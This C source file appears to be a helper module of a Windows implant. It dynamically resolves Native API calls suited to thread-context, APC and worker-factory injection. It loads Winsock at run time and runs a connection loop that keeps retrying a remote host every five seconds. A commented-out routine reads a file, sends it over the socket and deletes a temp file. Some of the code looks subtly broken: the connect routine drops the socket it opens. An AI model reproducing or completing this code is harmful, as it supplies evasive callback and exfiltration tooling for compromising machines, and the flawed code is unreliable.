#include "framework.h"
#include "pch.h"
#include "utils.h"
#include "utils_headers.h"
#include "headers.h"
#include "sleaping.h"
#include <stdlib.h>
#include <stdint.h>

bool load_core_functions(core_funtions_t* core_funcs)
{

	// handle to ntdll and user32
	HMODULE hm_ntdll = { 0 };
	HMODULE hm_user32 = { 0 };
	HMODULE hm_kernel32 = { 0 };
	if (!(hm_ntdll = GetModuleHandleA("ntdll"))) {
		return false;
	}
	if (!(hm_user32 = GetModuleHandleA("user32.dll"))) {
		return false;
	}
	if (!(hm_kernel32 = GetModuleHandleA("kernel32.dll"))) {
		return false;
	}

	// function pointers for thread contexts
	//func_addr->NtTestAlertAddress = GetProcAddress(hm_ntdll, "NtTestAlert");
	//func_addr->NtWaitForSingleObjectAddress = GetProcAddress(hm_ntdll, "NtWaitForSingleObject");
	//func_addr->MessageBoxAddress = GetProcAddress(hm_user32, "MessageBoxA");
	core_funcs->Sleep = (SLEEP_FN)GetProcAddress(hm_kernel32, "Sleep");

	if (core_funcs->Sleep == NULL
		)
	{
		return false;
	}


	return true;
}

bool load_nt_functions(PNT_FUNCTIONS nt_funcs)
{

	// Load the ntdll.dll library
	HMODULE hm_ntdll = GetModuleHandleA("ntdll.dll");
	if (hm_ntdll == NULL)
	{

		return false;
	}

	nt_funcs->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hm_ntdll, "NtWaitForSingleObject");//
	nt_funcs->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hm_ntdll, "NtQueueApcThread");//
	nt_funcs->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hm_ntdll, "NtGetContextThread");//
	nt_funcs->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hm_ntdll, "NtSetContextThread");//
	nt_funcs->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hm_ntdll, "NtCreateThreadEx"); // Added
	nt_funcs->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hm_ntdll, "NtCreateEvent");
	nt_funcs->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hm_ntdll, "NtResumeThread");//
	nt_funcs->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hm_ntdll, "NtQuerySystemInformation");
	nt_funcs->NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hm_ntdll, "NtQueryObject");
	nt_funcs->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hm_ntdll, "NtQueryInformationWorkerFactory");
	nt_funcs->NtTestAlert = (NtTestAlertFunc)GetProcAddress(hm_ntdll, "NtTestAlert");

	// Check if all function addresses were retrieved successfully
	if (!nt_funcs->NtResumeThread || !nt_funcs->NtWaitForSingleObject || !nt_funcs->NtQueueApcThread ||
		!nt_funcs->NtGetContextThread || !nt_funcs->NtSetContextThread || !nt_funcs->NtCreateThreadEx || !nt_funcs->NtCreateEvent
		|| !nt_funcs->NtQueryInformationWorkerFactory || !nt_funcs->NtQueryObject || !nt_funcs->NtQuerySystemInformation || !nt_funcs->NtTestAlert) // Modified
	{

		return false;
	}

	return true;

}
	
bool load_winsock_functions(winsock_functions_t* ws_funcs)
{
	HMODULE winsock_dll = NULL;
	winsock_dll = LoadLibraryA("ws2_32.dll");
	if (winsock_dll == NULL)
	{
		return false;
	}

	ws_funcs->WSAStartup = (WSASTARTUP_FN)GetProcAddress(winsock_dll, "WSAStartup");
	ws_funcs->Socket = (SOCKET_FN)GetProcAddress(winsock_dll, "socket");
	ws_funcs->Connect = (CONNECT_FN)GetProcAddress(winsock_dll, "connect");
	ws_funcs->Send = (SEND_FN)GetProcAddress(winsock_dll, "send");
	ws_funcs->Recv = (RECV_FN)GetProcAddress(winsock_dll, "recv");
	ws_funcs->CloseSocket = (CLOSESOCKET_FN)GetProcAddress(winsock_dll, "closesocket");
	ws_funcs->WSACleanup = (WSACLEANUP_FN)GetProcAddress(winsock_dll, "WSACleanup");
	ws_funcs->Bind = (BIND_FN)GetProcAddress(winsock_dll, "bind");
	ws_funcs->Listen = (LISTEN_FN)GetProcAddress(winsock_dll, "listen");
	ws_funcs->Accept = (ACCEPT_FN)GetProcAddress(winsock_dll, "accept");
	ws_funcs->Htons = (HTONS_FN)GetProcAddress(winsock_dll, "htons");
	ws_funcs->Inet_addr = (INET_ADDR_FN)GetProcAddress(winsock_dll, "inet_addr");
	ws_funcs->Inet_ntoa = (INET_NTOA_FN)GetProcAddress(winsock_dll, "inet_ntoa");
	ws_funcs->Inet_pton = (INET_PTON_FN)GetProcAddress(winsock_dll, "inet_pton");


	uint64_t* funcs_start = (uint64_t*)ws_funcs;
	int num = sizeof(*ws_funcs) / sizeof(void*);
	for (int i = 0; i < num; i++, funcs_start++)
	{
		if (*funcs_start == NULL)
		{
			FreeLibrary(winsock_dll);
			return false;
		}
	}

	return true;
}

int startup_wsa(winsock_functions_t* ws_funcs)
{
	WSADATA wsa_data;
	int result = 1;
	if ((result = ws_funcs->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
	{
		return -1;
	}

	return 0;
}

void cleanup_wsa(winsock_functions_t* ws_funcs)
{
	ws_funcs->WSACleanup();
}

int init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, core_funtions_t* core_funcs)
{
	SOCKET client_socket;
	struct sockaddr_in server_addr;

	int result = 1;

	while(1)
	{
		client_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
		if (client_socket == INVALID_SOCKET)
		{
			return -1;
		}

		server_addr.sin_family = AF_INET;
		server_addr.sin_port = ws_funcs->Htons(port);
		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
		{
			return -1;
		}

		result = ws_funcs->Connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

		if (result == SOCKET_ERROR)
		{
			ws_funcs->CloseSocket(client_socket);
			core_funcs->Sleep(5000);
			continue;
		}
		break;
	}

	return 0;

}



//int send_file(const char* filename, SOCKET sock)
//{
//	FILE* fp = NULL;
//	long file_size;
//	char* buffer = NULL;
//	size_t bytes_read;
//	int total_sent = 0;
//	int result;
//
//	// 打开文件
//	fp = fopen(filename, "rb");
//	if (!fp) {
//		//printf("无法打开文件: %s\n", filename);
//		return -1;
//	}
//
//	// 获取文件大小
//	fseek(fp, 0, SEEK_END);
//	file_size = ftell(fp);
//	fseek(fp, 0, SEEK_SET);
//
//	if (file_size <= 0) {
//		//printf("文件为空或无效\n");
//		fclose(fp);
//		return -1;
//	}
//
//	// 分配缓冲区
//	buffer = (char*)malloc(file_size);
//	if (!buffer) {
//		//printf("内存分配失败\n");
//		fclose(fp);
//		return -1;
//	}
//
//	// 读取文件
//	bytes_read = fread(buffer, 1, file_size, fp);
//	if (bytes_read != file_size) {
//		//printf("读取文件不完全\n");
//		free(buffer);
//		fclose(fp);
//		return -1;
//	}
//
//	fclose(fp);
//
//	// 发送文件大小（8字节，大端序）
//	uint64_t size_be = _byteswap_uint64((uint64_t)file_size);
//	result = send(sock, (char*)&size_be, sizeof(size_be), 0);
//	if (result == SOCKET_ERROR) {
//		int error = WSAGetLastError();
//		//printf("发送文件大小失败: %d\n", error);
//		free(buffer);
//		return -1;
//	}
//
//	// 发送文件数据
//	while (total_sent < file_size) {
//		int remaining = file_size - total_sent;
//		int to_send = remaining > 4096 ? 4096 : remaining;
//
//		result = send(sock, buffer + total_sent, to_send, 0);
//		if (result == SOCKET_ERROR) {
//			int error = WSAGetLastError();
//			//printf("发送数据失败: %d\n", error);
//			free(buffer);
//			return -1;
//		}
//
//		total_sent += result;
//	}
//
//	//printf("文件发送完成: %d 字节\n", total_sent);
//	free(buffer);
//	return 0;
//}
//
//int cleanup_temp_file(const char* filename)
//{
//	if (DeleteFileA(filename)) {
//		//printf("临时文件已删除\n");
//		return 0;
//	}
//	else {
//		DWORD error = GetLastError();
//		if (error != ERROR_FILE_NOT_FOUND) {
//			//printf("删除临时文件失败: %s (错误代码: %lu)\n", filename, error);
//		}
//		return -1;
//	}
//}
